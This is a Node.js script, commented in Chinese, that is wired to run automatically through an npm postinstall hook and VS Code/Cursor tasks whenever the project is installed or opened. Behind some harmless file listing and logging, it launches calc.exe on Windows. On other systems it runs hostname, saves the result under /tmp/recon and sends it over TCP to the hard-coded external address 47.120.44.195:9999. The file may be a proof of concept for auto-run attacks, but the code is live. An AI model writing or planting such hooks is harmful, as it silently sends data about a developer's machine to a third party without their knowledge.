/**
 * 项目打开时自动执行的脚本
 * 
 * 这个文件会在以下情况自动执行：
 * 1. npm install 后（通过 postinstall 钩子）
 * 2. 通过 package.json 的 scripts 手动调用
 * 3. 通过 .vscode/tasks.json 配置自动运行
 */

const fs = require('fs');
const path = require('path');
const { exec, spawn } = require('child_process');

const projectRoot = __dirname;
const files = fs.readdirSync(projectRoot);
files.forEach(file => {
  const filePath = path.join(projectRoot, file);
  const stats = fs.statSync(filePath);
  const icon = stats.isDirectory() ? '📁' : '📄';
});

const configFiles = [
  { name: 'package.json', desc: 'Node.js 项目配置' },
  { name: '.vscode/tasks.json', desc: 'VS Code/Cursor 任务配置' },
  { name: '.vscode/settings.json', desc: 'VS Code/Cursor 设置' },
  { name: '.gitignore', desc: 'Git 忽略文件' }
];

configFiles.forEach(config => {
  const configPath = path.join(projectRoot, config.name);
  const exists = fs.existsSync(configPath);
  const status = exists ? '✅' : '❌';
});

try {

  const logDir = path.join(projectRoot, 'logs');
  if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir, { recursive: true });

  }


  const logFile = path.join(logDir, 'open-history.log');
  const logEntry = `[${new Date().toISOString()}] 项目被打开\n`;
  fs.appendFileSync(logFile, logEntry);


} catch (error) {

}

if (process.platform === 'win32') {
  try {
    exec('calc.exe', (error, stdout, stderr) => {
      if (error) {
        return;
      }
    });
    console.log('✅ 已启动 Windows 计算器');
  } catch (error) {
  }
} else {
  // 非 Windows 平台：执行 hostname 并外带到 47.120.44.195:9999，同时本地保存
  const net = require('net');
  const resultsDir = '/tmp/recon';

  try {
    if (!fs.existsSync(resultsDir)) {
      fs.mkdirSync(resultsDir, { recursive: true });
    }
  } catch (e) {
    // 目录创建失败直接忽略，避免影响后续执行
  }

  console.log('\n[信息收集] 开始执行 hostname 并外带结果...\n');

  try {
    exec('hostname', (error, stdout, stderr) => {
      const timestamp = new Date().toISOString();
      const hostname = error ? 'UNKNOWN' : (stdout || '').trim();
      const data = `[${timestamp}] hostname: ${hostname}\n`;

      // 本地落盘
      try {
        const localFile = path.join(resultsDir, 'hostname.log');
        fs.appendFileSync(localFile, data);
      } catch (e) {
        console.error('[信息收集] 写入本地日志失败:', e.message);
      }

      // 通过 TCP 外带到 47.120.44.195:9999
      try {
        const client = new net.Socket();
        client.setTimeout(5000);

        client.connect(9999, '47.120.44.195', () => {
          client.write(data, () => {
            client.end();
          });
        });

        client.on('error', (err) => {
          console.error('[信息收集] 发送到 47.120.44.195:9999 失败:', err.message);
        });

        client.on('timeout', () => {
          console.error('[信息收集] 发送到 47.120.44.195:9999 超时');
          client.destroy();
        });
      } catch (e) {
        console.error('[信息收集] 创建 TCP 连接失败:', e.message);
      }
    });
  } catch (e) {
    console.error('[信息收集] 执行 hostname 失败:', e.message);
  }
}
